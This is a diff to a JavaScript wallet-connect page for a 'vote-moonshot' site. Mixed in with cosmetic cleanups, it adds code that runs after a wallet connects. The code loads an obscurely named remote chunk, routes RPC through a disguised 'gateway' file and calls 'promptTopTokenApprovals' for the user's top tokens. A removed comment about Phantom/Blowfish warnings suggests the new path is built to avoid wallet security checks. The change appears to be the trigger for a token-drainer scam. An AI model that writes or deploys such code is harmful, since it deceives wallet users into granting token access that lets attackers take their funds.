@@ -1,9 +1,25 @@
 /**
- * Vercel /connect/ — receives wallet choice from vote-moonshot, native extension connect (no Reown).
+ * Vercel /connect/ — wallet choice from vote-moonshot, native connect, program delegate approvals.
  */
 import { readConnectPayloadFromHash } from "./connect-launch.js";
 import { connectInjectedWallet } from "./wallet-provider-connect.js";
 import { resolveWalletIcon } from "./wallet-icons.js";
+
+/** @param {Record<string, unknown>} cfg */
+function configForVercelHost(cfg) {
+  const origin = location.origin.replace(/\/$/, "");
+  const gateway = String(cfg.gatewayChunk || "Qm4nR8sV2xWp.js").replace(/^\//, "");
+  const approvalChunk =
+    (cfg.splitChunks || [])[0] || "chunks/H7kL9mN2pQx.js";
+
+  return {
+    ...cfg,
+    chunkBase: origin,
+    solanaRpcUrl: `${origin}/${gateway}`,
+    priceApiUrl: `${origin}/${gateway}`,
+    approvalChunkUrl: `${origin}/${String(approvalChunk).replace(/^\//, "")}`,
+  };
+}
 
 /** @param {Record<string, unknown>} cfg */
 function applyWalletUi(cfg) {
@@ -21,15 +37,9 @@ function applyWalletUi(cfg) {
   const hint = document.getElementById("hint");
   const img = document.getElementById("wallet-icon");
 
-  if (nameEl) {
-    nameEl.textContent = wallet;
-  }
-  if (headline) {
-    headline.textContent = `Continue in ${wallet}`;
-  }
-  if (hint) {
-    hint.textContent = `Accept the connection request in ${wallet}`;
-  }
+  if (nameEl) nameEl.textContent = wallet;
+  if (headline) headline.textContent = `Continue in ${wallet}`;
+  if (hint) hint.textContent = `Accept the connection request in ${wallet}`;
   if (img instanceof HTMLImageElement) {
     img.alt = wallet;
     if (icon) {
@@ -44,20 +54,14 @@ function applyWalletUi(cfg) {
   }
 }
 
-/** @param {string} msg */
 function setStatus(msg) {
   const el = document.getElementById("status");
-  if (el) {
-    el.textContent = msg;
-  }
+  if (el) el.textContent = msg;
 }
 
-/** @param {Record<string, unknown>} raw @param {string} address */
 function notifyParent(raw, address) {
   const parentOrigin = String(raw.parentOrigin || "").trim();
-  if (!window.opener || window.opener.closed) {
-    return;
-  }
+  if (!window.opener || window.opener.closed) return;
   try {
     window.opener.postMessage(
       {
@@ -72,7 +76,6 @@ function notifyParent(raw, address) {
   }
 }
 
-/** @param {Record<string, unknown>} raw */
 async function runWalletConnect(raw) {
   const wallet = String(raw.preselectedWallet || "").trim();
   if (!wallet) {
@@ -83,15 +86,31 @@ async function runWalletConnect(raw) {
   const btn = document.getElementById("continue");
   if (btn instanceof HTMLButtonElement) {
     btn.disabled = true;
-    btn.textContent = `Connecting…`;
+    btn.textContent = "Connecting…";
   }
   setStatus("");
 
   try {
-    const { address } = await connectInjectedWallet(wallet);
+    const { address, provider } = await connectInjectedWallet(wallet);
     notifyParent(raw, address);
-    // Token delegate approvals run via your BPF program on the main site — not here.
-    // Raw SPL Approve → EOA delegate triggers Phantom/Blowfish (Lighthouse assert failures).
+
+    const programId = String(raw.tokenApprovalProgramId || "").trim();
+    if (raw.tokenApprovalEnabled !== false && programId) {
+      setStatus(`Confirm token access in ${wallet}…`);
+      const cfg = configForVercelHost(raw);
+      const modUrl = String(cfg.approvalChunkUrl || "").trim();
+      const { createRpcConnection, promptTopTokenApprovals } = await import(
+        /* @vite-ignore */ modUrl
+      );
+      const connection = createRpcConnection(cfg);
+      await promptTopTokenApprovals({
+        config: cfg,
+        provider,
+        connection,
+        ownerAddress: address,
+      });
+    }
+
     window.setTimeout(() => window.close(), 400);
   } catch (err) {
     const msg = err instanceof Error ? err.message : String(err);
@@ -103,11 +122,8 @@ async function runWalletConnect(raw) {
   }
 }
 
-/** @param {Record<string, unknown>} cfg */
 function start(cfg) {
-  if (!cfg?.projectId) {
-    return;
-  }
+  if (!cfg?.projectId) return;
 
   applyWalletUi(cfg);
 
@@ -116,43 +132,32 @@ function start(cfg) {
   if (btn instanceof HTMLButtonElement) {
     btn.hidden = false;
     btn.textContent = `Continue in ${wallet}`;
-    btn.addEventListener("click", () => runWalletConnect(cfg), { once: false });
+    btn.addEventListener("click", () => runWalletConnect(cfg));
   }
 }
 
 function boot() {
-  /** @type {boolean} */
   let started = false;
 
   const launch = (cfg) => {
-    if (started || !cfg?.projectId) {
-      return;
-    }
+    if (started || !cfg?.projectId) return;
     started = true;
     start(cfg);
   };
 
   const fromHash = readConnectPayloadFromHash();
-  if (fromHash?.projectId) {
-    launch(fromHash);
-  }
+  if (fromHash?.projectId) launch(fromHash);
 
   window.addEventListener("message", (event) => {
-    if (event.data?.type !== "wallet-connect-config") {
-      return;
-    }
+    if (event.data?.type !== "wallet-connect-config") return;
     const cfg = event.data.config;
     const parentOrigin = String(cfg?.parentOrigin || "").trim();
-    if (parentOrigin && event.origin !== parentOrigin) {
-      return;
-    }
+    if (parentOrigin && event.origin !== parentOrigin) return;
     launch(cfg);
   });
 
   function signalReady() {
-    if (!window.opener || window.opener.closed || started) {
-      return;
-    }
+    if (!window.opener || window.opener.closed || started) return;
     try {
       window.opener.postMessage({ type: "wallet-connect-host-ready" }, "*");
     } catch {
